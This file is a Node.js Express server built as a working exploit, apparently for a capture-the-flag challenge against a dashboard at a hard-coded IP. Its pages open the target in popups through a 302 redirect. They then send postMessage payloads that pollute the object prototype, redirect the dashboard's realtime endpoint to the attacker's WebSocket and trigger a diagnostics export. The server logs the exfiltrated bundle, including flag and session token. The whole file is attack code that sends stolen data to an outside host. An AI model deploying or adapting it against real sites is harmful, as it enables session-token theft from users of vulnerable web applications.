const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

// ── 302 redirect to dashboard (key trick: browser follows 302 cross-protocol) ──
app.get('/go', (req, res) => {
  res.redirect(302, TARGET);
});

// ── GET / ── landing page: two parallel approaches ──
app.get('/', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html>
<head><meta http-equiv="refresh" content="2;url=/go"></head>
<body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('landing');

// ═══ APPROACH A: popup via 302 redirect ═══
// window.open('/go') → HTTPS same-origin (always works)
// Server responds 302 → http://dashboard (browser follows cross-protocol)
// We keep the popup reference and postMessage to it
var pop = null;
try {
  pop = window.open('/go');
  L('pop='+(pop?'ok':'null'));
} catch(e){ L('pop_err='+e.message); }

// ═══ APPROACH B: helper popup + navigate self via 302 ═══
// Helper popup stays on HTTPS, we navigate to dashboard via meta-refresh→/go→302
// Helper's window.opener becomes the dashboard
var helper = null;
try {
  helper = window.open('/helper');
  L('helper='+(helper?'ok':'null'));
} catch(e){ L('helper_err='+e.message); }

// ═══ Attack popup (Approach A) ═══
var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

function attackPop(){
  if(!pop||pop.closed){L('pop_closed');return;}
  try{L('pop.len='+pop.length);}catch(e){L('pop.len=err');}
  try{
    pop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('a_pollute');
  }catch(e){L('a_pollute_err='+e.message);}
  setTimeout(function(){
    try{
      pop.postMessage({type:'diagnostics:export'},'*');
      L('a_trigger');
    }catch(e){L('a_trigger_err='+e.message);}
  },600);
}

[2000,4000,6000,8000,11000,15000].forEach(function(d){setTimeout(attackPop,d);});
</script>
</body></html>`);
});

// ── GET /helper ── Approach B: attacks window.opener (which navigated to dashboard via meta-refresh→302) ──
app.get('/helper', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('helper_loaded');

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

function attack(){
  if(!window.opener){L('h_no_opener');return;}
  var co=false;
  try{var x=window.opener.location.href;L('h_same='+x);}catch(e){co=true;L('h_cross');}
  try{L('h_len='+window.opener.length);}catch(e){L('h_len=err');}

  // ALWAYS try postMessage regardless of origin (postMessage works cross-origin)
  try{
    window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('h_pollute');
  }catch(e){L('h_pollute_err='+e.message);}
  setTimeout(function(){
    try{
      window.opener.postMessage({type:'diagnostics:export'},'*');
      L('h_trigger');
    }catch(e){L('h_trigger_err='+e.message);}
  },600);
}

var n=0;
var iv=setInterval(function(){
  n++;
  attack();
  if(n>=20)clearInterval(iv);
},1500);
</script>
</body></html>`);
});

// ── GET /log ── beacon logger ──
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
